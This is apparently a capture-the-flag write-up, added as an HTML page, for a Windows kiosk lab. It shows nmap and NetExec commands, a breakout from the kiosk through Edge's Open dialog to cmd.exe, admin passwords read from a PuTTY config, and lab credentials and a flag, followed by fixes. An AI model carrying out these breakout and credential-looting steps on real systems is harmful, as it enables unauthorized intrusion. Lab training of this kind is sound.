@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Edge (Easy): kiosk breakout with Edge to admin</title>
+<style>
+  :root {
+    --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
+    --accent: #ef3257; --good: #5ddea8; --code: #1a2433; --border: #243246;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.65; font-size: 16px;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
+  h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
+  .muted { color: var(--muted); }
+  .hero {
+    background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
+    border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 2rem;
+  }
+  .pill {
+    display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
+    border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
+    padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+  table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
+  table.meta td:first-child { color: var(--muted); width: 28%; }
+  pre {
+    background: var(--code); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px; overflow-x: auto; font-size: 0.84rem; line-height: 1.5;
+  }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; color: #c9e4ff; }
+  figure {
+    margin: 1.5rem 0; background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; padding: 10px; overflow: hidden;
+  }
+  figure img { max-width: 100%; height: auto; display: block; border-radius: 8px; }
+  figcaption { color: var(--muted); font-size: 0.88rem; margin-top: 0.6rem; padding: 0 4px; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
+  ul { padding-left: 1.2rem; }
+  a { color: #7cb8ff; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="hero">
+  <span class="pill">HackSmarter · Windows · Easy</span>
+  <h1>Edge: kiosk portal, Edge open dialog, PuTTY password, admin</h1>
+  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Solved 2026-08-06.</p>
+</div>
+
+<table class="meta">
+  <tr><td>Box</td><td>Edge</td></tr>
+  <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
+  <tr><td>Type</td><td>Windows kiosk breakout and stored passwords</td></tr>
+  <tr><td>Fault</td><td>Hardcoded portal password, Edge file open, PuTTY session password</td></tr>
+  <tr><td>Level</td><td>Easy</td></tr>
+  <tr><td>Target</td><td><code>10.1.194.128</code> host <code>VANTARAOPS</code></td></tr>
+  <tr><td>Result</td><td>Admin WinRM and root flag on Desktop</td></tr>
+</table>
+
+<h2>What you need to know</h2>
+<ul>
+  <li>WinRM, SMB, and RDP with NetExec after a handed password</li>
+  <li>Kiosk apps that replace the normal shell</li>
+  <li>Browser Open dialogs can start programs</li>
+  <li>PuTTY sessions often store passwords on disk</li>
+</ul>
+
+<h2>Main idea</h2>
+<p>
+A kiosk is only as safe as each process it can start. Edge Open is a file picker.
+A file picker can also start <code>cmd.exe</code>.
+</p>
+
+<h2>Story</h2>
+<p>
+You start as <code>jmorris</code> with a known password. The host runs a kiosk app named
+<code>VantaraOpsPortal.exe</code>. Read the portal code or config. Find the
+<code>svc_vdi</code> password. Log on with RDP as that user. Open Contact Support so Edge starts.
+Press Ctrl+O. Open <code>C:\Windows\System32\cmd.exe</code>. Read
+<code>putty.conf</code>. Use the admin password. Take the flag.
+</p>
+
+<h2>Why it works</h2>
+<p>
+Three faults sit together. The portal stores a service password. Support starts full Edge.
+The service profile keeps an admin password in PuTTY config. You do not need a kernel bug.
+</p>
+
+<pre>jmorris (WinRM)
+  → portal password for svc_vdi
+  → RDP kiosk → Contact Support → Edge
+  → Ctrl+O → cmd.exe
+  → Documents\putty.conf → svc_vdi_mgmt
+  → WinRM admin → root.txt</pre>
+
+<h3>Step 1: Scan and prove jmorris</h3>
+<div class="why"><strong>Why:</strong> You need open ports and a password that still works.</div>
+<pre>nmap -Pn -n --top-ports 200 -T4 --open 10.1.194.128
+nxc smb 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth
+nxc winrm 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth</pre>
+<p><strong>Expect:</strong> ports 135, 445, 3389 (and WinRM on this build). Host <code>VANTARAOPS</code>. Auth OK.</p>
+
+<figure>
+  <img src="images/01-login.png" alt="Portal login" />
+  <figcaption>Figure 1. Portal login screen.</figcaption>
+</figure>
+
+<h3>Step 2: Look for other accounts and portal files</h3>
+<div class="why"><strong>Why:</strong> Custom apps often hold secrets and ACLs.</div>
+<pre># WinRM as jmorris
+whoami /all
+dir C:\Users
+# search Vantara paths for portal source and scripts</pre>
+<p>Lab password for the kiosk user: <code>svc_vdi</code> / <code>V@ntara#Ops1</code>.</p>
+<p>Also seen: <code>svc_backup</code> / <code>P@ssw0rd!</code> with low rights.</p>
+
+<figure>
+  <img src="images/02-portal.png" alt="Portal after login" />
+  <figcaption>Figure 2. Portal after login.</figcaption>
+</figure>
+
+<h3>Step 3: RDP as svc_vdi</h3>
+<div class="why"><strong>Why:</strong> The kiosk runs as this user. You must break that jail.</div>
+<pre>nxc rdp 10.1.194.128 -u svc_vdi -p 'V@ntara#Ops1' --local-auth
+# or xfreerdp /v:10.1.194.128 /u:svc_vdi /p:'V@ntara#Ops1' /cert:ignore</pre>
+<p><strong>Expect:</strong> full screen <code>VantaraOpsPortal.exe</code>. No normal shell. Hard to close.</p>
+
+<h3>Step 4: Click Contact Support so Edge starts</h3>
+<div class="why"><strong>Why:</strong> Support calls <code>Process.Start(URL)</code>. You must click the control. A plain URL alone is not enough in this lab.</div>
+
+<figure>
+  <img src="images/03-support-edge.png" alt="Support opens Edge" />
+  <figcaption>Figure 3. Support path starts Microsoft Edge.</figcaption>
+</figure>
+
+<h3>Step 5: Edge open dialog to cmd.exe</h3>
+<div class="why"><strong>Why:</strong> The open file dialog is a normal Windows picker. Open a path to a program and that program runs as you.</div>
+<pre>In Edge:
+  Ctrl+O
+  File name: C:\Windows\System32\cmd.exe
+  Open</pre>
+<ul>
+  <li>The kiosk blocked the shell. It did not block Edge children.</li>
+  <li>Any UI that opens free paths can start a shell.</li>
+</ul>
+
+<figure>
+  <img src="images/04-cmd-escape.png" alt="cmd after open dialog" />
+  <figcaption>Figure 4. Command prompt after the open dialog.</figcaption>
+</figure>
+
+<figure>
+  <img src="images/05-cmd-shell.png" alt="cmd as svc_vdi" />
+  <figcaption>Figure 5. Shell as svc_vdi.</figcaption>
+</figure>
+
+<h3>Step 6: Read PuTTY config</h3>
+<div class="why"><strong>Why:</strong> Tools often store passwords next to the user profile.</div>
+<pre>type C:\Users\svc_vdi.VANTARAOPS\Documents\putty.conf
+# Password for session → svc_vdi_mgmt : 56tyghbn%^TYGHBN</pre>
+
+<h3>Step 7: Admin WinRM and flag</h3>
+<div class="why"><strong>Why:</strong> Prove admin and take the lab flag.</div>
+<pre>nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth
+nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth \
+  -x 'type C:\Users\Administrator\Desktop\root.txt'</pre>
+<div class="flag">1ts_N0t_a_BuG_1ts_a_F3atur3</div>
+
+<p><strong>Password chain</strong></p>
+<pre>jmorris / Fabricat!on2024        WinRM start
+svc_backup / P@ssw0rd!           limited SMB
+svc_vdi / V@ntara#Ops1           RDP kiosk
+svc_vdi_mgmt / 56tyghbn%^TYGHBN  admin</pre>
+
+<h2>Impact</h2>
+<ul>
+  <li>Kiosk breakout to a real shell</li>
+  <li>Local admin from a stored tool password</li>
+  <li>Full host control without a memory bug</li>
+</ul>
+
+<h2>Fix</h2>
+<ul>
+  <li>Do not put service passwords in the portal binary or next to it.</li>
+  <li>Use AppLocker or WDAC. Allow only the portal. Block Edge or lock the profile.</li>
+  <li>Do not start free URLs from help buttons.</li>
+  <li>Do not store admin passwords in PuTTY on kiosk accounts. Use LAPS.</li>
+  <li>Alert when the kiosk or browser starts cmd or PowerShell.</li>
+</ul>
+
+<h2>Extra notes</h2>
+<p>
+You can try to replace a service binary on disk. Stop and start of the service still needs admin.
+The intended path after the shell is password loot, not service abuse.
+</p>
+<ul>
+  <li>Ops notes: <code>~/htb/edge/ATTACK_LOG.md</code>, loot, screenshots</li>
+  <li>Public page: this URL on mccleod1290.github.io</li>
+</ul>
+
+<h2>Close</h2>
+<p>
+Edge is a locked UI with an open process tree. Once Edge is allowed, Open is enough.
+PuTTY then hands you admin.
+</p>
+
+<footer>
+  <p>Authorized training only. Do not use these steps without permission.</p>
+  <p><a href="../../../">mccleod1290.github.io</a> · <a href="../../">HackSmarter labs</a></p>
+</footer>
+
+</div>
+</body>
+</html>
